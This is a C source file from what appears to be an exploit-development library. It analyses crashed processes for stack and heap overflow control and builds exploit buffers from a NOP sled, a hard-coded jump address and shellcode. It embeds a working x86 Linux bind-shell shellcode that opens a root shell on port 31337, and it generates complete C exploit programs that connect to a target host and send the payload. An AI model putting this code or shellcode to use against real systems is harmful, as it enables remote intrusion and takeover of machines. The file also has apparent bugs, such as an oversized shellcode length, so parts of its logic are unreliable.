#include "../../include/BP-Main.h"

#if USE_BLOCKPARTY_DEBUGGING == 1

#if BLOCKPARTY_DEBUGGING_TARGET_32BIT == 1


// bind port listener shell
size_t bind31337size = 96;
char bind31337[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" 
					"\x31\xdb\xf7\xe3\xb0\x66\x53\x43" 
					"\x53\x43\x53\x89\xe1\x4b\xcd\x80" 
					"\x89\xc7\x52\x66\x68" 
					"\x7a\x69" 
					"\x43\x66\x53\x89\xe1\xb0\x10\x50" 
					"\x51\x57\x89\xe1\xb0\x66\xcd\x80" 
					"\xb0\x66\xb3\x04\xcd\x80\x50\x50"
					"\x57\x89\xe1\x43\xb0\x66\xcd\x80" 
					"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80" 
					"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3" 
					"\x51\x53\x89\xe1\xb0\x0b\xcd\x80";



// Creates a list of analysis's from a buffer list, basically parsing through the
// data list to create a reasonable picture of exploitability in a process.
P_EXPLOIT_ANALYSIS_LIST DebugGetExploitAnalysisFromDataList(P_DEBUG_HANDLE dbgHandle, P_DATA_LIST inList){

	if(inList == NULL)
		return NULL;
	
	
	P_EXPLOIT_ANALYSIS_LIST retList = NULL;
	for(inList = inList->first; inList != NULL; inList = inList->next){
		
		if(inList->dataType != READ){
			
			retList = DebugCreateExploitAnalysis(dbgHandle, inList->binData, inList->dataSize);
			
			
			// break if we found an exploitable condition
			if(retList->exploiting > 0){
				inList->isExploiting = true;
				printf("\n set inlist element exploiting to: %p", inList);
				printf("\n Returning with retlist, weird?");
				printf("\n Returning with retlist, weird?");
				printf("\n Returning with retlist, weird?");
				return retList;
			}
			
		} else {
			
		}
	}
	
	return retList;
}


// This creates an accurate exploit analysis, given a debugging handle
// if its signal was fatal, that signal is recorded.  Typically (6) IS
// a heap overflow, and 11 is a stack overflow or access violation.
P_EXPLOIT_ANALYSIS_LIST DebugCreateExploitAnalysis(P_DEBUG_HANDLE dbgHandle, char *payload, int payloadLength){
	
	if(dbgHandle == NULL)
		return NULL;
	
	if(dbgHandle->memory == NULL)
		return NULL;
	
	// Exploit analysis structure
	P_EXPLOIT_ANALYSIS_LIST exploitAnalysis = (P_EXPLOIT_ANALYSIS_LIST) bpmalloc(sizeof(EXPLOIT_ANALYSIS_LIST));
		memset(exploitAnalysis, 0x00, sizeof(EXPLOIT_ANALYSIS_LIST));
	
	// perform heap payload analysis
	if(dbgHandle->heap != NULL)
		exploitAnalysis->heapPayloadAnalysis = DebugCreateHeapPayloadAnalysis(dbgHandle, payload, payloadLength);
	
	// Determine if there was a heap corruption, if so mark heap exploitable
	if(exploitAnalysis->heapPayloadAnalysis != NULL){
		
		
		if(exploitAnalysis->heapPayloadAnalysis->controllingHeapNextOverflowed > 0){
			exploitAnalysis->exploiting = true;
			exploitAnalysis->exploitingInHeap = true;
		}
		
		if(exploitAnalysis->heapPayloadAnalysis->completePayloadMatch > 0){
			exploitAnalysis->exploiting = true;
			exploitAnalysis->exploitingInHeap = true;
		}
		
		
	}
	
	// perform stack payload analysis 	
	if(dbgHandle->stack != NULL)
		exploitAnalysis->stackPayloadAnalysis = DebugCreateStackPayloadAnalysis(dbgHandle, payload, payloadLength);
	
	// Determine if there was a stack corruption, if so mark stack exploitable
	if(exploitAnalysis->stackPayloadAnalysis != NULL){
		
		// most likesly if we have a complete match in the stack, we're looking
		// good.
		if(exploitAnalysis->stackPayloadAnalysis->completePayloadMatch > 0){
			exploitAnalysis->exploiting = true;
			exploitAnalysis->exploitingInHeap = true;
		}
		
		// cant be lower then esp to be a stack overflow on intel
		if(exploitAnalysis->stackPayloadAnalysis->matchIsLowerThanEsp < 1){
			exploitAnalysis->exploiting = true;
			exploitAnalysis->exploitingInHeap = true;
		}
		
	}
	
	// registers are taken directly from debug pointer and should always be there
	//DebugCreateRegisterAnalysis(dbgHandle, payload, payloadLength);

	
	return exploitAnalysis;
}


// ----------------------------------------------------
// creates the structures used in the exploit analysis
// ----------------------------------------------------


// Creates a heap to payload analysis of the given
// debugging session.
P_HEAP_PAYLOAD_ANALYSIS DebugCreateHeapPayloadAnalysis(P_DEBUG_HANDLE dbgHandle, char *payload, int payloadLength){
	
	// handle null checks
	if(dbgHandle == NULL)
		return NULL;
	
	if(payload == NULL)
		return NULL;
	
	if(payloadLength == 0)
		return NULL;
	
	
	// heap information
	P_HEAP_PAYLOAD_ANALYSIS heapAnalysis  = NULL;
	P_HEAP_CHUNK heapChunkFound               = NULL;
	P_PROCESS_HEAP heapFound                    = NULL;
	
	// creating a first loop to search through the heap llooking for our payload.
		
	// per each occurance of the payload matching a 16 byte alignment, a search is issued
	// into the container of the buffer.  
	//
	//		1). First it will directly attempt to match the buffer, which gives us our best case scenario.
	//			If the buffer is matched, we know that we control the entire heap from that occurance on.
	//
	//		2) If it is not directly matched, see how far of a match we get on that occurance, if  the match is 
	// 			less than 1 quarter of the entire payload, we have a partial match. Compare from the bottom of the
	// 			payload down the heap, reverse matching.  See if we control the bottom of the heap overflow.
	//
	//		3) If it is directly matched at the bottom, do we control the inband data and beyond with our payload?
	// 			If it is, then we know we can write a moderately reliable heap overflow.
				
	
	// create heap analysis structure to hold calculation results
	heapAnalysis = (P_HEAP_PAYLOAD_ANALYSIS) bpmalloc(sizeof(HEAP_PAYLOAD_ANALYSIS));
		memset(heapAnalysis, 0x00, sizeof(HEAP_PAYLOAD_ANALYSIS));
		
	void * firstHeapOccurance = NULL;
	
	// look through heap for all occurances
	for( firstHeapOccurance = DebugSearchHeap(dbgHandle, payload, 16, NULL);
			firstHeapOccurance != NULL;
			firstHeapOccurance = DebugSearchHeap(dbgHandle, payload, 16, firstHeapOccurance)){
				
		// record these variables to perform accurate heap crawling
		heapChunkFound = DebugHeapPointerGetChunk(dbgHandle, firstHeapOccurance);
		heapFound          = DebugHeapPointerGetHeap(dbgHandle, firstHeapOccurance);
		
	
		// 1) Condition Implementation
		if(DebugSearchHeap(dbgHandle, payload, payloadLength, firstHeapOccurance) == firstHeapOccurance){
			heapAnalysis->completePayloadMatch = 1;	
		}
		
		// mark if likely overflowed
		if(heapChunkFound->next->likelyOverflow > 0){
				heapAnalysis->controllingHeapNextOverflowed = 1;
		}
		
		// offset of the buffer match from the start of the chunk
		heapAnalysis->controllingHeapOffset = (size_t) firstHeapOccurance - (size_t) heapChunkFound->base;
		
		// calculate and set next valid arena types 
		size_t nextArena = ((size_t) firstHeapOccurance + (1024 * 1024) );
		nextArena = nextArena & 0xfff00000;
		heapAnalysis->nextValidArena = (void *) nextArena;
		
		// calculate and set the distance from our buffer occurance 
		// to our next heap arena. 
		size_t bytesToNext = (size_t) heapAnalysis->nextValidArena - (size_t) firstHeapOccurance;
		 
		// distance in bytes to next arena
		heapAnalysis->distanceToNextArena = bytesToNext;
		
		// number of chunks required to write, as well as the space for the
		// remainder chunk.
		heapAnalysis->padChunksTillArena = bytesToNext / 1028;
		heapAnalysis->padChunksTillArenaRemainder = bytesToNext % 1028;
		
		// distance to the next chunk header (includes offset)
		heapAnalysis->distanceToNextChunk = (  ((size_t) heapChunkFound->base + (size_t) heapChunkFound->realSize - heapAnalysis->controllingHeapOffset) \
																-   ((size_t) firstHeapOccurance - heapAnalysis->controllingHeapOffset)  );
		
		// printf("\n First Occurance: %p", firstHeapOccurance);
		// printf("\n Next Chunk: %x", ((size_t) heapChunkFound->base + (size_t) heapChunkFound->realSize));
		// printf("\n Distance to next chunk: %x", heapAnalysis->distanceToNextChunk);
		// printf("\n Using Header Offset: %x", heapAnalysis->controllingHeapOffset);
		// printf("\n Next Arena: %p", heapAnalysis->nextValidArena);
		// printf("\n Number of 1028 byte chunks till next arena is found: %i", heapAnalysis->padChunksTillArena);
		// printf("\n Number of remainder bytes left over after padding: %i", heapAnalysis->padChunksTillArenaRemainder);
		
		break;
		
	}
	

	return heapAnalysis;
}


// Creates a stack to payload analysis
P_STACK_PAYLOAD_ANALYSIS DebugCreateStackPayloadAnalysis(P_DEBUG_HANDLE dbgHandle, char *payload, int payloadLength){
		
	
	
	// handle null checks
	if(dbgHandle == NULL)
		return NULL;
	
	if(payload == NULL)
		return NULL;
	
	if(payloadLength == 0)
		return NULL;
	
	// heap information
	P_STACK_PAYLOAD_ANALYSIS stackAnalysis  = NULL;
	
	GetMemMap(dbgHandle);
	DebugGetStackFromMapping(dbgHandle);
	DebugGetHeapFromMapping(dbgHandle);
	
	// creating a first loop to search through the stack looking for our payload.
	// per each occurance of the payload matching a 16 byte alignment, a search is issued
	// into the container of the buffer.  
	//
	//		1). If the 4 byte values found above and below esp are found in
	//		     our payload, it is a likely indication of a stack overflow.  If in
	//			addition the value right above esp is in eip, we have an exploitable
	//			condition.
	//
	//		2) If our buffer matches past the end of the valid stack top
	// 			it is likely that we have a buffer overflow issue.
	//		

	// create heap analysis structure to hold calculation results
	stackAnalysis = (P_STACK_PAYLOAD_ANALYSIS) bpmalloc(sizeof(STACK_PAYLOAD_ANALYSIS));
		memset(stackAnalysis, 0x00, sizeof(STACK_PAYLOAD_ANALYSIS));
	
	void * firstStackOccurance = NULL;
	
	printf("\n -------------------------------------[+][+]");
	
	// look through heap for a minimum match of 16 bytes (memory intesive but reliable)
	for( firstStackOccurance = DebugSearchStack(dbgHandle, payload, 16, NULL);
			firstStackOccurance != NULL;
			firstStackOccurance = DebugSearchStack(dbgHandle, payload, 16, firstStackOccurance)){
	

		// 1) Condition Implementation
		if(DebugCompareMemory(dbgHandle, firstStackOccurance, payload, payloadLength) == ERR_SUCCESS){


			if((size_t) firstStackOccurance > (size_t) dbgHandle->esp){
				stackAnalysis->completePayloadMatch = 1;
				stackAnalysis->matchIsLowerThanEsp = 1;
				break;
			} else {
				stackAnalysis->completePayloadMatch = 1;	
			}
			
		} else {
			// advance the stack pointer 4 bytes to allow for continued analysis
			firstStackOccurance = (void *)((size_t) firstStackOccurance + 16);
			
			// continue the loop till we find a 100% match, if no
			// match can be found, advanced algorithms will determine
			// exploitability.
			continue;
		}
	
		stackAnalysis->distanceToEip = ((size_t) dbgHandle->esp - 4) - (size_t) firstStackOccurance + 1;
		stackAnalysis->payloadAddr = (void *) firstStackOccurance;
			
		// compare stack layout		
		if(DebugCompareMemory(dbgHandle, (void *) (dbgHandle->esp-4), (char *) &dbgHandle->eip, 4) == ERR_SUCCESS){

			// now compare the value in eip to that of our offset in the provided payload
			if(DebugCompareMemory(dbgHandle, (void *) ((size_t) firstStackOccurance + stackAnalysis->distanceToEip), (char *) &dbgHandle->eip , 4) == ERR_SUCCESS){
				stackAnalysis->overflowConditionsGood = 1;
				stackAnalysis->spaceForShellcode = payloadLength - stackAnalysis->distanceToEip - 4;
			}	
		}
		
		// if we've gotten here, we know that we've calculated what we need
		
		return stackAnalysis;
	}
	

	// if we could not find an instance of our buffer starting at the top.
	// Try from the bottom (from $esp-4) on, this gives us an accurate
	// idea of if we are still in control of eip using our buffer.
	
	// matches need to be tried from the last byte of our payload
	// down from esp, for full matching.  If a match is made, try again
	// because if the match was very short, it could be matched again 
	// by the next 4 bytes plus our analyzed bytes
	
	// this method is used second in our list of tries because it is
	// simply more memory intensive then the first.
	
	int payloadCtr = 0;
	int compareEvaluation = 0;

	// There may be a bug here in calculating non 4 byte aligned values
	
	// so crazy
	while(DebugCompareMemory(dbgHandle, (void *) (dbgHandle->esp-4), (char *) &payload[payloadCtr] , payloadLength-payloadCtr) != ERR_SUCCESS){
		payloadCtr++;
		
		if(payloadCtr >= payloadLength){
			break;
		}
		
	}
	
	// esp + match has been made
	// program appears to be controllable
	if(payloadCtr < payloadLength){
		
		// payload ctr now equals our control offset
		// into eip.
		stackAnalysis->overflowConditionsGood = 1;
		size_t tempDistanceToEip = (payloadLength - payloadCtr);
		
		stackAnalysis->distanceToEip = payloadLength - tempDistanceToEip;
		
		// stackAnalysis->payloadAddr = (void *) (dbgHandle->esp - 4 - payloadCtr);		
		
		// this is dependent on the size of the payload most
		// of the time, if not enough space is there, perhaps
		// try it again with a longer overwrite buffer.
		stackAnalysis->spaceForShellcode = tempDistanceToEip;
		tempDistanceToEip = 0;
	}
	
	return stackAnalysis;
}

// looks at a stack analysis, and returns a likely exploit buffer
// given the stack analysis in the dbgHandle
P_EXPLOIT_SET DebugCreateLikelyStackExploit(P_EXPLOIT_ANALYSIS_LIST exploitAnalysis, char nopChar, char *shellcode, size_t scLen){
	
	if(exploitAnalysis == NULL){
		return NULL;
	}
	
	if(exploitAnalysis->stackPayloadAnalysis == NULL){
		return NULL;
	}
	
	// cannot use a null byte as a nop char
	if(nopChar == 0x00)
		return NULL;
	
	
	P_EXPLOIT_SET exploit = (P_EXPLOIT_SET) bpcalloc(sizeof(EXPLOIT_SET), 1);
	
	// Calculates our payload lengths
	int payloadLength = 0;
	
	
	// we can overflow reliable if we get in here
	if(exploitAnalysis->stackPayloadAnalysis->overflowConditionsGood > 0){
		
		exploit->buffer = (char *) bpmalloc(exploitAnalysis->stackPayloadAnalysis->distanceToEip + 4 + scLen + 10);
		memset(exploit->buffer, 0x00, exploitAnalysis->stackPayloadAnalysis->distanceToEip + 4 + scLen + 10);
		
		// Make payload 4 byte aligned (100% accuracy as of yet)
		for(payloadLength = exploitAnalysis->stackPayloadAnalysis->distanceToEip; payloadLength % 4 != 0; payloadLength--){
		}
		
		// nops first
		//memset(exploit->buffer, nopChar, exploitAnalysis->stackPayloadAnalysis->distanceToEip);
		memset(exploit->buffer, nopChar, payloadLength);
				
		// jmp esp next
		strncat(exploit->buffer, "\x77\xe7\xff\xff", 4);
		
		// shellcode next
		memcpy(&exploit->buffer[bpstrlen(exploit->buffer)], shellcode, scLen);
		
		// assign length
		exploit->size = bpstrlen((char *)exploit->buffer);
		
		// Return most likely working exploit set :>
		return exploit;
		
	}
	
	// Failed, return null 
	return NULL;
}

// Creates a register analysis list per register
P_REGISTER_ANALYSIS_LIST DebugCreateRegisterAnalysis(P_DEBUG_HANDLE dbgHandle, char *payload, int payloadLength){
	return NULL;
}


// ------------------- EXPLOIT BUFFER CREATION ROUTINES ------------------------

// Creates a C styled exploit buffer given a name, id, and length
char * ExploitCreateBuffer_C(char * name, char *id, int size){
	char *exploitBuffer = (char *) bpmalloc(10000);
	memset(exploitBuffer, 0x00, 10000);
	
	// size buffer used to inject into files
	char *sizeBuff = (char *) bpmalloc(100);
	memset(sizeBuff, 0x00, 100);
	snprintf(sizeBuff, 99, "%i", size);
	
	// create buffer to hold our payload
	strncat(exploitBuffer, "\tchar *", 7);
	strncat(exploitBuffer, name, 255);
	strncat(exploitBuffer, " = (char *) bpmalloc(", 19);
	strncat(exploitBuffer, sizeBuff, 15);
	strncat(exploitBuffer, "+1);\n", 5);
	
	// open payload file
	strncat(exploitBuffer, "\tFILE *", 7);
	strncat(exploitBuffer, name, 255);
	strncat(exploitBuffer, "File = fopen(\"./payload", 24);
	strncat(exploitBuffer, id, 10);
	strncat(exploitBuffer, ".bin", 4);
	strncat(exploitBuffer, "\", \"r\");\n", 10);
	
	// now fread
	strncat(exploitBuffer, "\tfread(", 7);
	strncat(exploitBuffer, name, 255);
	strncat(exploitBuffer, ", 1, ", 5);
	strncat(exploitBuffer, sizeBuff, 255);
	strncat(exploitBuffer, ", ", 3);
	strncat(exploitBuffer, name, 255);
	strncat(exploitBuffer, "File);\n", 7); 
	
	// now set length variable 
	strncat(exploitBuffer, "\tint ", 6);
	strncat(exploitBuffer, name, 255);
	strncat(exploitBuffer, "Size", 4);
	strncat(exploitBuffer, " = ", 5);
	strncat(exploitBuffer, sizeBuff, 255);
	strncat(exploitBuffer, ";", 1);
	
	return exploitBuffer;
}

// Creates a Perl styled exploit buffer given a string and id
char * ExploitCreateBuffer_Perl(char * name, char *id, int size){
	return NULL;
}

// Creates a Python styled exploit buffer given a string and id
char * ExploitCreateBuffer_Python(char * name, char *id, int size){
	return NULL;
}

// Creates a Ruby styled exploit buffer given a string and id
char * ExploitCreateBuffer_Ruby(char * name, char *id, int size){
	return NULL;
}


// ------------------- ANALYSIS PRINT FUNCTIONS ------------------------

void DebugPrintStackAnalysis(P_EXPLOIT_ANALYSIS_LIST analysis){
	if(analysis == NULL)
		return;
	
	if(analysis->stackPayloadAnalysis == NULL){
		printf("\n No stack to analyze.");
		return;
	}
	printf("\n -----------------------------------------------------------------");
	printf("\n [Stack Analysis]");
	
	printf("\n [+] Payload Partial Match At: %p", analysis->stackPayloadAnalysis->payloadAddr);
	printf("\n [+] 100 percent at partial address:");
	if(analysis->stackPayloadAnalysis->completePayloadMatch > 0)
		printf("YES");
	else
		printf("NO");
	
	printf("\n [+} Is our match greater than esp (should never happen for stack overflows, err if yes): ");
	if(analysis->stackPayloadAnalysis->matchIsLowerThanEsp > 0)
		printf("YES");
	else
		printf("NO");
	
	printf("\n [+] Total Distance (in bytes) to EIP?: %i", analysis->stackPayloadAnalysis->distanceToEip);
		
	printf("\n [+] Are overflow conditions optimal for exploitation [EIP Control]?: ");
	if(analysis->stackPayloadAnalysis->overflowConditionsGood > 0)
		printf("YES");
	else
		printf("NO");
	
	printf("\n [+] Conditions report space for shellcode (byt`es): %i", analysis->stackPayloadAnalysis->spaceForShellcode);
	printf("\n-------------------------------------------------------------\n");
}

void DebugPrintHeapAnalysis(P_EXPLOIT_ANALYSIS_LIST analysis){
	if(analysis == NULL)
		return;
	
	if(analysis->heapPayloadAnalysis == NULL){
		printf("\n No heap to analyze.");
		return;
	}
	
	printf("\n -----------------------------------------------------------------");
	printf("\n [Heap Analysis]");
	
	printf("\n [+] Offset (in bytes) to payload start (from chunk start): %i", analysis->heapPayloadAnalysis->controllingHeapOffset);
	
	printf("\n [+] Payload was matched completely in the heap: ");
	if(analysis->heapPayloadAnalysis->completePayloadMatch > 0)
		printf("YES");
	else
		printf("NO");
	
	printf("\n Is the heap chunk following our buffer overflowed: ");
	if(analysis->heapPayloadAnalysis->controllingHeapNextOverflowed > 0)
		printf("YES");
	else
		printf("NO");

	printf("\n Distance (in bytes) to next chunk: %i", analysis->heapPayloadAnalysis->distanceToNextChunk);
	printf("\n Address of next valid arena: %p", analysis->heapPayloadAnalysis->nextValidArena);
	printf("\n Distance to next arena (in bytes) : %i", analysis->heapPayloadAnalysis->distanceToNextArena);
	printf("\n Number of 1028 byte pad chunks past arena: %i", analysis->heapPayloadAnalysis->padChunksTillArena);
	printf("\n Remainder bytes to pad till arena: %i", analysis->heapPayloadAnalysis->padChunksTillArenaRemainder);
	printf("\n -----------------------------------------------------------------");	
	
}

void DebugPrintRegisterAnalysis(P_EXPLOIT_ANALYSIS_LIST analysis){

}

void DebugPrintAllAnalysis(P_EXPLOIT_ANALYSIS_LIST analysis){

}

// -----------------------------------------------------------
// Buffer operations from C to write exploits

char * ExploitCreateFullSource(P_EXPLOIT_ANALYSIS_LIST analysis, P_DATA_LIST dataList, char *host, unsigned short port, int proto){
	
	char * exploitFileContent = (char *) bpmalloc(10000000);
	memset(exploitFileContent, 0x00, 10000000);
	P_EXPLOIT_SET exploitData;
	
	strcat(exploitFileContent, "#include <stdlib.h>\n");
	strcat(exploitFileContent, "#include <stdio.h>\n");
	strcat(exploitFileContent, "#include <string.h>\n");
	strncat(exploitFileContent, "#include <sys/types.h>\n",  bpstrlen("#include <sys/types.h>\n"));
	strncat(exploitFileContent, "#include <stdio.h>\n",      bpstrlen("#include <stdio.h>\n"));
	strncat(exploitFileContent, "#include <stdio.h>\n",		 bpstrlen("#include <stdio.h>\n"));
	strncat(exploitFileContent, "#include <sys/socket.h>\n", bpstrlen("#include <sys/socket.h>\n"));
	strncat(exploitFileContent, "#include <netinet/tcp.h>\n",bpstrlen("#include <netinet/tcp.h>\n"));
	strncat(exploitFileContent, "#include <netinet/in.h>\n", bpstrlen("#include <netinet/in.h>\n"));
	strncat(exploitFileContent, "#include <arpa/inet.h>\n",  bpstrlen("#include <arpa/inet.h>\n"));
	strncat(exploitFileContent, "#include <netdb.h>\n\n",    bpstrlen("#include <netdb.h>\n\n"));
			
	strncat(exploitFileContent, "int main(int argc, char **argv){\n\n", bpstrlen("int main(int argc, char **argv){\n\n"));
	
	// socket variables
	strncat(exploitFileContent, "\n\tstruct sockaddr_in addrStruct;", bpstrlen("\n\tstruct sockaddr_in addrStruct;"));
	strncat(exploitFileContent, "\n\tstruct hostent *hostStruct;", bpstrlen("\n\tstruct hostent *hostStruct;"));
	strncat(exploitFileContent, "\n\tint len;", bpstrlen("\n\tint len;"));
	strncat(exploitFileContent, "\n\tint sock;\n\n", bpstrlen("\n\tint sockfd;\n\n"));
	
	// windows socket startup
	strncat(exploitFileContent, "\t#ifdef _WIN32\n", bpstrlen("\t#ifdef _WIN32\n"));
		strncat(exploitFileContent, "\t\tWSADATA wsa;\n", bpstrlen("\t\tWSADATA wsa;\n"));
		strncat(exploitFileContent, "\t\tWSAStartup(MAKEWORD(2,0), &wsa);\n", bpstrlen("\t\tWSAStartup(MAKEWORD(2,0), &wsa);\n"));
	strncat(exploitFileContent, "\t#endif\n\n", bpstrlen("\t#endif\n\n"));
	
	// setup connect parameters
	strncat(exploitFileContent, "\thostStruct = gethostbyname(\"", bpstrlen("\thostStruct = gethostbyname(\""));
	strcat(exploitFileContent, host);
	strcat(exploitFileContent, "\");\n\t");
	
	strcat(exploitFileContent, "sock = socket(AF_INET, SOCK_STREAM, 0);\n");
	strcat(exploitFileContent, "\n\n");
	
	// set family
	strcat(exploitFileContent, "addrStruct.sin_family = AF_INET;\n");
	
	// set port
	strcat(exploitFileContent, "addrStruct.sin_port = htons(");
		sprintf(&exploitFileContent[bpstrlen(exploitFileContent)], "%u", htons(port));
	strcat(exploitFileContent, ");\n\n");
	
	// set addr
	strcat(exploitFileContent, "addrStruct.sin_addr = *((struct in_addr *)hostStruct->h_addr);\n");
	strcat(exploitFileContent, "memset(&(addrStruct.sin_zero), '\\0', 8);\n\n");
	
	strcat(exploitFileContent, "connect(sock, (struct sockaddr *)&addrStruct, sizeof(struct sockaddr));\n");
		
	
	char * shellcodeBuff;
	printf("\n Analysis: %p", analysis->occuringBuffer);
	
	size_t sendCount = 0;
	size_t recvCount = 0;
	
	char nameBuff[1000];
		memset(nameBuff, 0x00, 1000);
	char sendRecvLenVarBuff[1000];
		memset(sendRecvLenVarBuff, 0x00, 1000);
		
	for(dataList = dataList->first; dataList != NULL; dataList = dataList->next){
				
		// Fill in read buffer if exists
		if(dataList->dataType == READ){
			memset(nameBuff, 0x00, 1000);
			sprintf(nameBuff, "\n\nchar recvBuff%i[%i];", recvCount, dataList->dataSize);
				strcat(exploitFileContent, nameBuff);
				memset(nameBuff, 0x00, 1000);
			sprintf(nameBuff, "recvBuff%i", recvCount);
			
			sprintf(&exploitFileContent[bpstrlen(exploitFileContent)], "\nrecv(sock, %s, %i, 0);\n", nameBuff, dataList->dataSize);
			strcat(exploitFileContent, "\n");
			recvCount++;
		}
		
		// Fill in binary buffer if exists
		if(dataList->dataType == BINARY){
			memset(nameBuff, 0x00, 1000);
			sprintf(nameBuff, "sendBuff%i", sendCount);
					
			if(dataList->isExploiting > 0){
						
				exploitData = DebugCreateLikelyStackExploit(analysis, 'A', (char *) bind31337, 10000);
				shellcodeBuff = GetBufferToStyle(exploitData->buffer, nameBuff, exploitData->size, SC_C_STYLE_UNSIGNED);
				
				// embed the send buffer
				strncat(exploitFileContent, shellcodeBuff, 1000);
				strcat(exploitFileContent, "\n");
								
				sprintf(&exploitFileContent[bpstrlen(exploitFileContent)], "\nsend(sock, %s, %i, 0);",nameBuff, exploitData->size);
				
			} else {
				

			}
			
			// increment the send count
			sendCount++;
			
			
			
		}
		
		memset(nameBuff, 0x00, 1000);
		
		// printf("\n OK WTF: analysis->occuringBuffer: %p, dataList: %p", analysis->occuringBuffer, dataList);
				
	}
	
	strcat(exploitFileContent, "\n\n return 0;\n}\n");
	// printf("\n%s", exploitFileContent);

	
	return exploitFileContent;
}
#endif // #if BLOCKPARTY_DEBUGGING_TARGET_32BIT == 1


#endif // USE_BLOCKPARTY_DEBUGGING == 1

